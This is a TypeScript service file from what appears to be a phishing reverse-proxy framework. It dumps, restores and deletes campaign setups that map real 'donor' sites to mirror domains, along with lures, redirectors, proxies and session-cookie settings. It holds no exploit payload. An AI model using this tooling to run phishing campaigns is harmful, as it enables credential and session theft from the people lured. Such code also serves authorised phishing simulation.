import { arrayIncludes, DIContainer, randomIdent } from '@famir/common'
import {
  CAMPAIGN_REPOSITORY,
  CampaignRepository,
  DatabaseError,
  DatabaseErrorCode,
  LURE_REPOSITORY,
  LureRepository,
  PROXY_REPOSITORY,
  ProxyRepository,
  REDIRECTOR_REPOSITORY,
  RedirectorRepository,
  TARGET_REPOSITORY,
  TargetRepository
} from '@famir/database'
import { ReplServerError } from '@famir/repl-server'
import { DumpPhishmapData, Phishmap, PrunePhishmapData, RestorePhishmapData } from './phishmap.js'

export const PHISHMAP_SERVICE = Symbol('PhishmapService')

export class PhishmapService {
  static inject(container: DIContainer) {
    container.registerSingleton<PhishmapService>(
      PHISHMAP_SERVICE,
      (c) =>
        new PhishmapService(
          c.resolve<CampaignRepository>(CAMPAIGN_REPOSITORY),
          c.resolve<ProxyRepository>(PROXY_REPOSITORY),
          c.resolve<TargetRepository>(TARGET_REPOSITORY),
          c.resolve<RedirectorRepository>(REDIRECTOR_REPOSITORY),
          c.resolve<LureRepository>(LURE_REPOSITORY)
        )
    )
  }

  protected confirmSecret: string

  constructor(
    protected readonly campaignRepository: CampaignRepository,
    protected readonly proxyRepository: ProxyRepository,
    protected readonly targetRepository: TargetRepository,
    protected readonly redirectorRepository: RedirectorRepository,
    protected readonly lureRepository: LureRepository
  ) {
    this.confirmSecret = randomIdent()
  }

  async dump(data: DumpPhishmapData): Promise<Phishmap> {
    let lockSecret: string
    try {
      lockSecret = await this.campaignRepository.lock(data.campaignId)
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code
          })
        }
      }

      throw error
    }

    try {
      const campaign = await this.campaignRepository.readFull(data.campaignId)
      const proxies = await this.proxyRepository.list(data.campaignId)
      const targets = await this.targetRepository.listFull(data.campaignId)
      const redirectors = await this.redirectorRepository.listFull(data.campaignId)
      const lures = await this.lureRepository.list(data.campaignId)

      if (!(campaign && proxies && targets && redirectors && lures)) {
        throw new ReplServerError(`Dump phishmap failed`, {
          code: 'INTERNAL_ERROR'
        })
      }

      return {
        campaign: {
          campaignId: campaign.campaignId,
          mirrorDomain: campaign.mirrorDomain,
          description: campaign.description,
          landingUpgradePath: campaign.landingUpgradePath,
          sessionCookieName: campaign.sessionCookieName,
          sessionExpire: campaign.sessionExpire,
          newSessionExpire: campaign.newSessionExpire,
          messageExpire: campaign.messageExpire
        },
        proxies: proxies.map((proxy) => {
          return {
            proxyId: proxy.proxyId,
            url: proxy.url,
            isEnabled: proxy.isEnabled
          }
        }),
        targets: targets.map((target) => {
          return {
            targetId: target.targetId,
            isLanding: target.isLanding,
            donorSecure: target.donorSecure,
            donorSub: target.donorSub,
            donorDomain: target.donorDomain,
            donorPort: target.donorPort,
            mirrorSecure: target.mirrorSecure,
            mirrorSub: target.mirrorSub,
            mirrorPort: target.mirrorPort,
            labels: target.labels,
            connectTimeout: target.connectTimeout,
            simpleTimeout: target.simpleTimeout,
            streamTimeout: target.streamTimeout,
            headersSizeLimit: target.headersSizeLimit,
            bodySizeLimit: target.bodySizeLimit,
            mainPage: target.mainPage,
            notFoundPage: target.notFoundPage,
            faviconIco: target.faviconIco,
            robotsTxt: target.robotsTxt,
            sitemapXml: target.sitemapXml,
            isEnabled: target.isEnabled
          }
        }),
        redirectors: redirectors.map((redirector) => {
          return {
            redirectorId: redirector.redirectorId,
            page: redirector.page
          }
        }),
        lures: lures.map((lure) => {
          return {
            lureId: lure.lureId,
            path: lure.path,
            redirectorId: lure.redirectorId,
            isEnabled: lure.isEnabled
          }
        })
      }
    } finally {
      await this.campaignRepository.unlock(data.campaignId, lockSecret)
    }
  }

  async restore(data: RestorePhishmapData): Promise<true> {
    const { campaign, proxies, targets, redirectors, lures } = data.phishmap

    const campaignId = data.campaignId ?? campaign.campaignId

    try {
      await this.campaignRepository.create(
        campaignId,
        data.mirrorDomain ?? campaign.mirrorDomain,
        data.description ?? campaign.description,
        data.cryptSecret ?? randomIdent(),
        data.landingUpgradePath ?? campaign.landingUpgradePath,
        data.sessionCookieName ?? campaign.sessionCookieName,
        data.sessionExpire ?? campaign.sessionExpire,
        data.newSessionExpire ?? campaign.newSessionExpire,
        data.messageExpire ?? campaign.messageExpire
      )
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['CONFLICT']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code
          })
        }
      }

      throw error
    }

    let lockSecret: string
    try {
      lockSecret = await this.campaignRepository.lock(campaignId)
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code
          })
        }
      }

      throw error
    }

    try {
      for (const proxy of proxies) {
        await this.proxyRepository.create(campaignId, proxy.proxyId, proxy.url, lockSecret)

        if (proxy.isEnabled) {
          await this.proxyRepository.enable(campaignId, proxy.proxyId, lockSecret)
        }
      }

      for (const target of targets) {
        await this.targetRepository.create(
          campaignId,
          target.targetId,
          target.isLanding,
          target.donorSecure,
          target.donorSub,
          target.donorDomain,
          target.donorPort,
          target.mirrorSecure,
          target.mirrorSub,
          target.mirrorPort,
          target.connectTimeout,
          target.simpleTimeout,
          target.streamTimeout,
          target.headersSizeLimit,
          target.bodySizeLimit,
          target.mainPage,
          target.notFoundPage,
          target.faviconIco,
          target.robotsTxt,
          target.sitemapXml,
          lockSecret
        )

        for (const label of target.labels) {
          await this.targetRepository.appendLabel(campaignId, target.targetId, label, lockSecret)
        }

        if (target.isEnabled) {
          await this.targetRepository.enable(campaignId, target.targetId, lockSecret)
        }
      }

      for (const redirector of redirectors) {
        await this.redirectorRepository.create(
          campaignId,
          redirector.redirectorId,
          redirector.page,
          lockSecret
        )
      }

      for (const lure of lures) {
        await this.lureRepository.create(
          campaignId,
          lure.lureId,
          lure.path,
          lure.redirectorId,
          lockSecret
        )

        if (lure.isEnabled) {
          await this.lureRepository.enable(campaignId, lure.lureId, lockSecret)
        }
      }

      return true
    } finally {
      await this.campaignRepository.unlock(campaignId, lockSecret)
    }
  }

  async prune(data: PrunePhishmapData): Promise<true> {
    this.checkConfirmSecret(data.confirmSecret)

    let lockSecret: string
    try {
      lockSecret = await this.campaignRepository.lock(data.campaignId)
    } catch (error) {
      if (error instanceof DatabaseError) {
        const knownErrorCodes: DatabaseErrorCode[] = ['NOT_FOUND', 'FORBIDDEN']

        if (arrayIncludes(knownErrorCodes, error.code)) {
          throw new ReplServerError(error.message, {
            code: error.code
          })
        }
      }

      throw error
    }

    try {
      const campaign = await this.campaignRepository.readFull(data.campaignId)
      const proxies = await this.proxyRepository.list(data.campaignId)
      const targets = await this.targetRepository.listFull(data.campaignId)
      const redirectors = await this.redirectorRepository.listFull(data.campaignId)
      const lures = await this.lureRepository.list(data.campaignId)

      if (!(campaign && proxies && targets && redirectors && lures)) {
        throw new ReplServerError(`Build phishmap failed`, {
          code: 'INTERNAL_ERROR'
        })
      }

      for (const lure of lures) {
        if (lure.isEnabled) {
          await this.lureRepository.disable(lure.campaignId, lure.lureId, lockSecret)
        }

        await this.lureRepository.delete(
          lure.campaignId,
          lure.lureId,
          lure.redirectorId,
          lockSecret
        )
      }

      for (const redirector of redirectors) {
        await this.redirectorRepository.delete(
          redirector.campaignId,
          redirector.redirectorId,
          lockSecret
        )
      }

      for (const target of targets) {
        if (target.isEnabled) {
          await this.targetRepository.disable(target.campaignId, target.targetId, lockSecret)
        }

        await this.targetRepository.delete(target.campaignId, target.targetId, lockSecret)
      }

      for (const proxy of proxies) {
        if (proxy.isEnabled) {
          await this.proxyRepository.disable(proxy.campaignId, proxy.proxyId, lockSecret)
        }

        await this.proxyRepository.delete(proxy.campaignId, proxy.proxyId, lockSecret)
      }

      await this.campaignRepository.delete(campaign.campaignId, lockSecret)
    } catch (error) {
      await this.campaignRepository.unlock(data.campaignId, lockSecret)

      throw new ReplServerError(`Prune phishmap failed`, {
        cause: error,
        code: 'INTERNAL_ERROR'
      })
    }

    return true
  }

  protected checkConfirmSecret(confirmSecret: string | undefined) {
    if (!(confirmSecret && confirmSecret === this.confirmSecret)) {
      throw new ReplServerError(`Phishmap action canceled`, {
        context: {
          reason: `Confirm secret not provided or not match`,
          confirmSecret: this.confirmSecret
        },
        code: 'FORBIDDEN'
      })
    }

    this.confirmSecret = randomIdent()
  }
}
